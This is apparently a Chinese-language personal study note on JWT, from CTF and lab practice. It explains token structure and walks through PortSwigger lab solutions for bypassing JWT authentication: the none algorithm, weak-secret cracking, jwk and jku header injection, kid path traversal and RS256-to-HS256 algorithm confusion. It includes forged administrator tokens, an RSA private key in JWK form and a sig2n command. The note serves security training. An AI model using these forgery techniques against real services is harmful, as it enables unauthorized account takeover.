---
tags:
  - CTF
  - web
  - JWT
---
# 0x01啥是JWT？
**JWT (JSON Web Token)**
session不支持跨域，同源策略[前端跨域系列（1）- 同源策略介绍所谓同源是指"协议+域名+端口"三者相同，即便两个不同的域名指向同一个ip地址，也非同 - 掘金](https://juejin.cn/post/6879360544323665928/)
[奇安信攻防社区-JWT渗透姿势](https://forum.butian.net/share/2734)
[CTF比赛中JWT漏洞的利用 - 先知社区](https://xz.aliyun.com/t/14214?u_atoken=309d4e9c051794542cb4a8285bb6401f&u_asig=ac11000117319288006701860e0044)
下面是一个JWT在线构造和解构的平台：[JSON Web 令牌 - jwt.io](https://jwt.io/)

[奇安信攻防社区-JWT渗透姿势](https://forum.butian.net/share/2734)


//seeion+cookie token
# 0x02工作原理
JWT的工作流程如下：
- 用户在客户端登录并将登录信息发送给服务器
- 服务器使用私钥对用户信息进行加密生成JWT并将其发送给客户端
- 客户端将JWT存储在本地，每次向服务器发送请求时携带JWT进行认证
- 服务器使用公钥对JWT进行解密和验证，根据JWT中的信息进行身份验证和授权
- 服务器处理请求并返回响应，客户端根据响应进行相应的操作

**header**
```json
{
  "alg": "HS256", 
  "typ": "JWT"
}
```

**payload**
```json
{
  "sub": "1234567890",
  "name": "John Doe",
  "iat": 1516239022
}
```

**Signature**
```php
HMACSHA256(base64UrlEncode(header) + "." +base64UrlEncode(payload),secret)
```


# 0x03jwt漏洞










# 0x04CTF练习

^66cba3

[所有实验室 |网络安全学院](https://portswigger.net/web-security/all-labs#jwt)

## 未经验证的签名绕过
使用wiener:peter登录，并抓包
![](图片/Pasted%20image%2020241119091955.png)
![](图片/Pasted%20image%2020241119092042.png)
获得jwt：
```
eyJraWQiOiI3MTFiODFhYi1kNmQyLTQxMzgtYmVmNC1mZjIyYzYzMjk4ZDAiLCJhbGciOiJSUzI1NiJ9.eyJpc3MiOiJwb3J0c3dpZ2dlciIsImV4cCI6MTczMTk4Mjc1Mywic3ViIjoid2llbmVyIn0.Lfox9_7e8hr7-oSFkTGCDRt4tgTo4rWDg5Xo9p6TCpK-5ZcTsXzSY5lY58jlOzM1uqz-Pe2Sj_-YTvh6ORmxCesqLlg6gwdoPZpeGA6jeLzbSfeMGJLThBoIevAXd9CiMSqzFjbTqmtFRnwxfOpDjt0ULMsiqIaixj-dDQHI3Wiq5kc_EZiuMaRPff0Ac8koCpXy_ByXi0MCHXhcdoBHWcDh7JBkC6ZC3_jUPu92aPghuhd7reBC7IWTQY5iBEPQXIU9iWHfzEztIeWtcQwozwQyTbTrk8hXnimwYvGupfyquqBV50W6BxhdAehPAs1PAaFHMazltKhVMq1QRBN1wg
```
![](图片/Pasted%20image%2020241119092304.png)
![](图片/Pasted%20image%2020241119094309.png)

## 有缺陷的签名绕过
与上一题处理方法相似，获得jwt之后，解码，将加密算法改为none，再将用户改为`administrator`将最后的加密编码删除（保留`.`）
```
eyJraWQiOiIyNTM4MjY5ZS1mYjNkLTQxMmMtODQ1Yi1hOTcxYmZiYzRlY2MiLCJhbGciOiJSUzI1NiJ9.eyJpc3MiOiJwb3J0c3dpZ2dlciIsImV4cCI6MTczMTk4NDI4Niwic3ViIjoid2llbmVyIn0.IUDa3_aZWZz-F4WuMO9Dxc0wkrv1PW8tZFZOh7eXcjCgGbuU0fDP9fULulJCWgLSVc1o3x0Yz3U5w-EnFkZ1iZJPzbyVWurnprOwN3tMV-VgiWRuMiFbmrqpY26hAXNLGCCyvddidvUiCvdDPjDsZJnBS2uKgLzBcIvSfSZnu2q3KLy4Pdqb-Yo9tKlmBgWSxDjjFd2lqUUKkrzis14kO_8AGHHEnpUD4OPM_ZN9nlnfUmh7dtWZEALCD2ZywWAt3WWKSzESxj7KSImzItmfA_koEYqjjxQAjJ30h6ImWEVBMtrB4Ep_hc0oP5F3p7O5SkmxyX0X3dwPsVn7zsberg
```

![](图片/Pasted%20image%2020241119095202.png)

```
ewogICJraWQiOiAiMjUzODI2OWUtZmIzZC00MTJjLTg0NWItYTk3MWJmYmM0ZWNjIiwKICAiYWxnIjogIm5vbmUiCn0.ewogICJpc3MiOiAicG9ydHN3aWdnZXIiLAogICJleHAiOiAxNzMxOTg0Mjg2LAogICJzdWIiOiAiYWRtaW5pc3RyYXRvciIKfQ.
```


## 通过弱签名密钥绕过 JWT 身份验证

```
eyJraWQiOiJjN2MyNTliYi0yOWMyLTQ2MjQtYWUwOS0xZDkyNDYxMmNjNjEiLCJhbGciOiJIUzI1NiJ9.eyJpc3MiOiJwb3J0c3dpZ2dlciIsImV4cCI6MTczMTk4NjI4Niwic3ViIjoid2llbmVyIn0.c3_gtKVGlW7fUxOpNeXBFvcmMEr5KKuIFM2yhxz12aQ
```



![](图片/Pasted%20image%2020241119102252.png)

![](图片/Pasted%20image%2020241119102455.png)

```
eyJraWQiOiJjN2MyNTliYi0yOWMyLTQ2MjQtYWUwOS0xZDkyNDYxMmNjNjEiLCJhbGciOiJIUzI1NiJ9.eyJpc3MiOiJwb3J0c3dpZ2dlciIsImV4cCI6MTczMTk4NjI4Niwic3ViIjoiYWRtaW5pc3RyYXRvciJ9.3olarDF3RwK5Wq8QLPX9CefBnz0RufUIr-4bpUVOWig
```

## 通过 jwk 标头注入绕过 JWT 身份验证

使用Burpsuite插件JWT editor生成新的RSA
![](图片/Pasted%20image%2020241119105547.png)
打开靶场——》抓包——》发送到repeater
![](图片/Pasted%20image%2020241119105654.png)
获得JWT
```
eyJraWQiOiIxMjJjMmQ1Mi1iYzljLTQ3N2MtODdjNS01YTAxMzU1Nzk0ZDciLCJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiIsImp3ayI6eyJrdHkiOiJSU0EiLCJlIjoiQVFBQiIsImtpZCI6IjEyMmMyZDUyLWJjOWMtNDc3Yy04N2M1LTVhMDEzNTU3OTRkNyIsIm4iOiJ0QnIxVWJvYVpRLXVhZndWVExNY3FDMFo3Y3JaM2xMcWZJQ3RDSjlEYlVKNFVIREdLN0tXZFJfd21WaGpoV3dpN0lzSTQ3OV9VMUt2QnRNeDFMSnlEZTZpMlFlZ3lWc0FiTGlGcXlfWXAtNjF5VzdkT3ZwbHlERmNqNHMtLTl4Nk85UXV0eS1rOGczamItUFFubkNZMUFDeHVYM2lFMno3SzFyeTZXb25VMXZjUzd3SGFsYjRja010b1d1T0dRc3Vyd2ZTcGt2aHZwX0E5VmNjM0JTYzlSNDNuRlJDX2t4Rjg0b3BnQ3FNd3RqQkI3NXE2M0xlay1Rb3NNZGxWWVBFc2hBNWE4dkpJVFFUSE14N2RDalRJaGMxU2QyVVJSR2xSSUFKTVlvakFzaW9rTE9ldmp2dWozU0VnV3ExWm1JenFjVElsSC1qZDlwakdCUWJsLW9HN3cifX0.eyJpc3MiOiJwb3J0c3dpZ2dlciIsImV4cCI6MTczMTk4ODMxMCwic3ViIjoiYWRtaW5pc3RyYXRvciJ9.WzuEpOlXsqtLtzrSfm0nffYNvHkyNSFClkNXoprYUOQMbFHexPVVr2ngkTt1PuzoW2CmxF8FDF5DOqSZbHzigzVgj5Zt3Cbfo0bxn7l2HTXZOPz70Dufrt8YEnvPB0Oqg1We3pW_jfBWnsI_-7K_4HMoT0LQNabSm4cyK2QmYziEQRUgOT7ZN1woQSIGtMe8_9seKHOz1c4FzvupWhB9iCcp0-ZJDPk5B5A4TU4Ss8LTyl5MIhVYKsRTuXKwKeyEfrcOYHX_04N8d8qMKUXEi7htWQSv7fFnEx9Tj_rvTo2BsDIysTKQoPZwZplOPvpfEhTcoKXYNsIVaTPrK6csYQ
```
使用json web token插件 修改用户为"administrator" attack选择embedded JWK使用刚才的RSA生成新的JWT
![](图片/Pasted%20image%2020241119105751.png)
![](图片/Pasted%20image%2020241119105935.png)
```
eyJraWQiOiIxMjJjMmQ1Mi1iYzljLTQ3N2MtODdjNS01YTAxMzU1Nzk0ZDciLCJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiIsImp3ayI6eyJrdHkiOiJSU0EiLCJlIjoiQVFBQiIsImtpZCI6IjEyMmMyZDUyLWJjOWMtNDc3Yy04N2M1LTVhMDEzNTU3OTRkNyIsIm4iOiJ0QnIxVWJvYVpRLXVhZndWVExNY3FDMFo3Y3JaM2xMcWZJQ3RDSjlEYlVKNFVIREdLN0tXZFJfd21WaGpoV3dpN0lzSTQ3OV9VMUt2QnRNeDFMSnlEZTZpMlFlZ3lWc0FiTGlGcXlfWXAtNjF5VzdkT3ZwbHlERmNqNHMtLTl4Nk85UXV0eS1rOGczamItUFFubkNZMUFDeHVYM2lFMno3SzFyeTZXb25VMXZjUzd3SGFsYjRja010b1d1T0dRc3Vyd2ZTcGt2aHZwX0E5VmNjM0JTYzlSNDNuRlJDX2t4Rjg0b3BnQ3FNd3RqQkI3NXE2M0xlay1Rb3NNZGxWWVBFc2hBNWE4dkpJVFFUSE14N2RDalRJaGMxU2QyVVJSR2xSSUFKTVlvakFzaW9rTE9ldmp2dWozU0VnV3ExWm1JenFjVElsSC1qZDlwakdCUWJsLW9HN3cifX0.eyJpc3MiOiJwb3J0c3dpZ2dlciIsImV4cCI6MTczMTk4ODMxMCwic3ViIjoiYWRtaW5pc3RyYXRvciJ9.WzuEpOlXsqtLtzrSfm0nffYNvHkyNSFClkNXoprYUOQMbFHexPVVr2ngkTt1PuzoW2CmxF8FDF5DOqSZbHzigzVgj5Zt3Cbfo0bxn7l2HTXZOPz70Dufrt8YEnvPB0Oqg1We3pW_jfBWnsI_-7K_4HMoT0LQNabSm4cyK2QmYziEQRUgOT7ZN1woQSIGtMe8_9seKHOz1c4FzvupWhB9iCcp0-ZJDPk5B5A4TU4Ss8LTyl5MIhVYKsRTuXKwKeyEfrcOYHX_04N8d8qMKUXEi7htWQSv7fFnEx9Tj_rvTo2BsDIysTKQoPZwZplOPvpfEhTcoKXYNsIVaTPrK6csYQ
```
登录/admin修改cookie成功登录

## 通过 jku 标头注入绕过 JWT 身份验证

相同方法获得JWT

```
eyJraWQiOiJkZDk2ZTE5My01ZWVkLTQ0ZDgtYWE4NC00OTIyN2MwZjBhOTAiLCJhbGciOiJSUzI1NiJ9.eyJpc3MiOiJwb3J0c3dpZ2dlciIsImV4cCI6MTczMTk4OTk4Miwic3ViIjoid2llbmVyIn0.VA5R3iNJfR7EL8RCSgk2Svo8kmHZVx2BvRid2ELUcjTL653eBmet4bY1sQmBVdwXRSIZVshvtf8vrJeUJrfbCfD2reJXgceIRTuGOJ8TvZgfvua_wwHaZ4sTOgELNHMVgXS7nIQMFbXlh1nw8J5ZjVzRIDgkdYWEEcCK3tAz4QbQyagN3ElpvmH8Gw9Yx5mI3gvAgz9m1XtMNyE0lOFtZCvqF9pOiX3UyUs9y3kr6yZYJBSQ1o5oJUafFkD9B3HJ6IDEAj4OcO4TNBvdHEpRYjLJEPDTUC2tsIhWbMN8eoFmGefSRISrLj6e4YxLDe5are3IrtrvsZyhwVD3IZBE3A
```

```
{
    "keys": [
        {
            "p": "22AfktnoMNiJFgiEhuhG8sPeCrfw_bHFHkeb5QEW92rPMK430_0MV4wJb-iIUQAjEo_MGTqEfWw4750v2MWvMYyn1x0OJnZWqBNgjpeamFjWrMswv3oQ3vbhvFB6gW3f7ebzxO5f0zLuLxRCx2aFZJUjbUAH1RFXRCAZjEKpTPU",
            "kty": "RSA",
            "q": "w3TMEqhDrmZkCzwipf53LtwOAFn6he9KKj0CrU_2P3I6G2FKxIYbtPM5tQy82YgCPAZ_VHSuxJwltlfZlM-U7mawU891bqUUhgjBOkFAz1JI2QsI9YhPJRJmzyPGVfj8_mLTReK-Eed8FB2dvJkkdGAF6DZssbCeuqyWYXlPwfk",
            "d": "Ay4oZEWD3eAkdDQ80EQlcRtbY1-8Lg1_adsheyXsnvc8Y3gpy7vZWg3_1xr8t-4OWPjsrrlyFOE6l-I9ghwKiTmzgA8z5hnCFPIWfGNYoaqQvL1Xu3C3XCTX3ZF3vepSejQI16SBKfU0mMOWib6xuAnJiDGlbpEhJhepf8qaPNypRa6cBSp673ZSXSRgNYd214S9oWrMMTvzTQbol_tYRvQoMqFAmmnf8y5ffkHY4FiadbyoNHuetf8VihVGtEfUfFPsMPi4DzNcrx-Wy6HDM3EejiXqRri8-jRKgr-J72nMRfJpzF1eSkwG8CBA6JzKNXMa00Nx0IEapsNeeAYXOQ",
            "e": "AQAB",
            "kid": "44f38a8a-1b49-4ac8-ace3-b74fa26009ce",
            "qi": "bBxXNe0V7q0AsG_AspochL9nUzWiAoSldzXyTeTlvmKRQrmlwQeEjNTGCJJ4Z8DcIQe8lSTCrEfR3YGD2Y31AQpEz7qgcKxO9TKryu9J7Wj0HFI0Nk4hkkU042p-jDaptws4kFwAm0yfp1Z4LTZZAZtV_LnJDmmjceb1qROs9_s",
            "dp": "YBiHPCjAEUWJJ2Gry_zLt2QdS8yvgDHzCwSLQZFsogzjnYtzYSUj1uW87IyLyg-pTWQ4H4UGrHpPpobQgsB1sdrPWuebXzXPV-jFDzFRwxKHV0HapMWvxjuXPopyX2fmA6x7c_SHfVh-BZl2dyptnFXIIv89bxQdifYVut8oklE",
            "dq": "h2KYlHfO4bd0pr-RtG8NePzeCepJeIpmUdmOyCOyCwKBM0Px-Sx3dqBfIYRgL0FhYtiRTBvCjtcl3Cb_xG8A1x10F6mEyw43qBvaVBKs5K43XXeiTgiL4b7cTbCXCif8fexQMYE8bMRuErTs9J0TPjThApboNTCE0gMH6x6PW2k",
            "n": "p35Oe8Ci7LchttxgeFbuaU2qrCvYQHjL4qKEUoyBWP9B4YFBfoM5hDZgm8FlB5Kcz4rI2HJfERokr5ghwHEaoTuNPt43VBAN9SVzEy2yUBTU5c8PwmAa3LV6ldHwE5YTIzA6tiaXjRs3007YvRtntceHYj9M4397eNSiJOOusChh-L5L_rFKGYA65TArvjMUjOb_ONS1dRQ-FnBtIbcix1kxXGdKN65X0WAZVuleJjPq38qH-sRxTofM2eUYpVs0seX5MM9pkMRyi-VJDO55MIi9-S1xkzT3EjxxqJ60FMLsOJRJWQBn1Hfuv2q_FkhKbwVu16YKckzQH-YiBkuPTQ"
        }
    ]
}
```
![](图片/Pasted%20image%2020241119114459.png)
![](图片/Pasted%20image%2020241119114523.png)
最终得到新的JWT

```
ewogICAgImtpZCI6ICI0NGYzOGE4YS0xYjQ5LTRhYzgtYWNlMy1iNzRmYTI2MDA5Y2UiLAogICAgImprdSI6ICJodHRwczovL2V4cGxvaXQtMGExMDAwOWQwMzI2YTczMDgyNWM5YmU3MDEzMDAwYTMuZXhwbG9pdC1zZXJ2ZXIubmV0L2V4cGxvaXQiLAogICAgImFsZyI6ICJSUzI1NiIKfQ.eyJpc3MiOiJwb3J0c3dpZ2dlciIsImV4cCI6MTczMTk4OTk4Miwic3ViIjoiYWRtaW5pc3RyYXRvciJ9.YXKVN87qOSFPtxZ8RddbbHqhMgMQLItE2WNKAw5JRBW7GWaThqehAGTR339Tw1xrj_AFctlhfdj318-rLYCAJ_6Zkjo4PL-YJ3lZqRKy6ppcD8wwLaw79BEcbK9KNgm6OcPleps0LGTB_-9oCoUirushbHvfGrHHRIB8YMJDGLPobjWJfj8tPWbKS6aoGShXKn639kzhO4OouUMHnIQoKlk_lU4B8gmUYhaQmJ6eLidavBbQNfNVP-U6qfG0QNWR0-aViwNZHRHm0UudKbQf_EgE4IyYeMxlK-tLhT4h2sfAYM83XwMCq5EIn6_71U5escOvTzMxQg_84-00WX_EPw
```


##  通过 kid 标头路径遍历绕过 JWT 身份验证

抓包获得JWT
JWT editor生成对称把密码![](图片/Pasted%20image%2020241119122708.png)
将K改为AA= 也就是null的意思
```
eyJraWQiOiIxYWM3ZmFhMy0xNDdiLTRlODEtYjA0OC1jZmQ5Y2VhNTgxYmMiLCJhbGciOiJIUzI1NiJ9.eyJpc3MiOiJwb3J0c3dpZ2dlciIsImV4cCI6MTczMTk5MzU5Niwic3ViIjoid2llbmVyIn0.yFVWlz2OnpjZz_RgrF6e-ULN8GzfMLV-0oeqPOsmt0w
```
![](图片/Pasted%20image%2020241119122315.png)


## 通过算法混淆绕过 JWT 身份验证
同样先抓包
![](图片/Pasted%20image%2020241119125444.png)
服务器有时通过映射到/jwks.json或/.well-known/jwks.json的端点将它们的公钥公开为JSON Web Key(JWK)对象，比如大家熟知的/jwks.json，这些可能被存储在一个称为密钥的jwk数组中，这就是众所周知的JWK集合

```
{"keys":[{
"kty":"RSA",
"e":"AQAB",
"use":"sig",
"kid":"6176012e-f8ae-492c-8dfc-e117db229923",
"alg":"RS256",
"n":"uzmfWwLbhbN02mRy5euvZLROJLLORs27MLnTTbdpVyTpAQFJZORWhgji6AOl0MwV1zBqnmrfnOvOuEz9m1cafPj-HpM3G6FoXMXAE_XUo2DhFD7LLqWB8FpNHvRKyQFUks7W7cIHFOp0TjopHmIsJWuSmhskBFzLLO7MYS1E-QlzkbyUq_7YgwvSmI6CKjdq-vcBwBgC_-L0MYl2pRVNO0GM7_vno4358TP1z3nZ-sNEOlReVncP5RgOnsNLA-S66auTTQSmXV0fIhjmWvsFoq3AfT1K_MkVDgftdVLF5uruyUItSMtp93I-mOyGZHdDUbpXDshnH_giZcHv5YNwAw"
}]}
```

![](图片/Pasted%20image%2020241119125601.png)
![](图片/Pasted%20image%2020241119125906.png)
Copy Public Key as PEM
```Copy Public Key as PEM
-----BEGIN PUBLIC KEY-----
MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEAuzmfWwLbhbN02mRy5euv
ZLROJLLORs27MLnTTbdpVyTpAQFJZORWhgji6AOl0MwV1zBqnmrfnOvOuEz9m1ca
fPj+HpM3G6FoXMXAE/XUo2DhFD7LLqWB8FpNHvRKyQFUks7W7cIHFOp0TjopHmIs
JWuSmhskBFzLLO7MYS1E+QlzkbyUq/7YgwvSmI6CKjdq+vcBwBgC/+L0MYl2pRVN
O0GM7/vno4358TP1z3nZ+sNEOlReVncP5RgOnsNLA+S66auTTQSmXV0fIhjmWvsF
oq3AfT1K/MkVDgftdVLF5uruyUItSMtp93I+mOyGZHdDUbpXDshnH/giZcHv5YNw
AwIDAQAB
-----END PUBLIC KEY-----

```


```base64
LS0tLS1CRUdJTiBQVUJMSUMgS0VZLS0tLS0KTUlJQklqQU5CZ2txaGtpRzl3MEJBUUVGQUFPQ0FROEFNSUlCQ2dLQ0FRRUF1em1mV3dMYmhiTjAybVJ5NWV1dgpaTFJPSkxMT1JzMjdNTG5UVGJkcFZ5VHBBUUZKWk9SV2hnamk2QU9sME13VjF6QnFubXJmbk92T3VFejltMWNhCmZQaitIcE0zRzZGb1hNWEFFL1hVbzJEaEZEN0xMcVdCOEZwTkh2Ukt5UUZVa3M3VzdjSUhGT3AwVGpvcEhtSXMKSld1U21oc2tCRnpMTE83TVlTMUUrUWx6a2J5VXEvN1lnd3ZTbUk2Q0tqZHErdmNCd0JnQy8rTDBNWWwycFJWTgpPMEdNNy92bm80MzU4VFAxejNuWitzTkVPbFJlVm5jUDVSZ09uc05MQStTNjZhdVRUUVNtWFYwZkloam1XdnNGCm9xM0FmVDFLL01rVkRnZnRkVkxGNXVydXlVSXRTTXRwOTNJK21PeUdaSGREVWJwWERzaG5IL2dpWmNIdjVZTncKQXdJREFRQUIKLS0tLS1FTkQgUFVCTElDIEtFWS0tLS0tCg==
```
总结JWT库函数问题，在选择RS256和HS256时出现问题
RSA为非对称加密 存在公钥和私钥 私钥存在客户端保密 公钥在服务端有可能泄露
HMAC为对称加密 只存在密钥

将JWT的加密算法由RSA篡改为HMAC，由于JWT库的漏洞导致服务器提取RSA的公钥作为提交JWT算法HMAC的加密密钥，从而导致漏洞

简单说就是，提交伪造篡改的JWT让服务器使用RSA的公钥作为HMAC加密算法的解密密钥



## 通过算法混淆绕过 JWT 身份验证，没有暴露的密钥
首先获取两次JWT 利用两次JWT爆破处公钥
之后和上一题一致

```
eyJraWQiOiI3NjM1NDVlOS1kOWM4LTRjNDAtYjBlMi1mYTNmYmJmYWRkMzciLCJhbGciOiJSUzI1NiJ9.eyJpc3MiOiJwb3J0c3dpZ2dlciIsImV4cCI6MTczMTk5OTMwMiwic3ViIjoid2llbmVyIn0.V7UpZ2kcVRaX-npKziwSiNM1WK2xD9s4v_TPSqgl0yRjJJdclOzdAPtx9N7lBXSzOSHgJL-5FUAIzTm4KjXwTgFgch0cHXHMzekD3PkREb5zvNJ1PUIlYEI8YeyxnolLDqvAqSoa2cjnaxjR_Nz_oPvZUVzPoccFqQ0syGfRu0QQs2TyCOsUsdjZsgtp3NvT5ocuV7X4PqBHu7hlo-NZnzvSFqre1ONlXmFQ6ckFgDShi5FlCzqGGOTGJnCIxsWG_VLgBhK4MoczRIdU62B5YlG3R3ibdociJJxc_GGtwGueAhS8Gv-yfdev6mFWzRKLb3tL2cRkh_6ZB-7d1PsqDw
```

```
eyJraWQiOiI3NjM1NDVlOS1kOWM4LTRjNDAtYjBlMi1mYTNmYmJmYWRkMzciLCJhbGciOiJSUzI1NiJ9.eyJpc3MiOiJwb3J0c3dpZ2dlciIsImV4cCI6MTczMTk5OTMyOSwic3ViIjoid2llbmVyIn0.BTJ5J2fjdKcF-Z4Ywu7VEsUSZo-jOTJZfuhj2Dab2NpqXu4D2Stx4rqAhE5JfCCNdSJSwZRgTMH9UuHjvp9yob-KUOhoOS0EEoX-3Sce7QcYi348sf2Te8vzza7PqWfCiXONAADzBujRjU3otkltjYa0XuAmpuhdiTQ4uxaW9AqbwXY38rMiF05S3kJsQKn9nwLgOxaxvkt5kXpCOCclKnvx_98K2itLeziXC2hiXJ4CkkVOcwMjT2bM-FOCIlXp_X-tjq16pMGcyQyUo_pL9MRVFUW9hxZW5uUqiJ5OtmE_Pywpo4PMuIdtWlXv2IpNaRiD7w-A2jZQFuyVON1-gw
```

使用命令
```php
docker run --rm -it portswigger/sig2n <token1> <token2>
```
获得key
![](图片/3ff3b664c5c43d757a71bc6b11a2bb0.jpg)
在bp中建立对称加密算法
使用上述得到的公钥 作为密钥加密








# 0x05工具
jwt_tool——》kali 桌面[JWT攻击手册 - Bypass - 博客园](https://www.cnblogs.com/xiaozi/p/12005929.html)
burpsuite
ctfhub



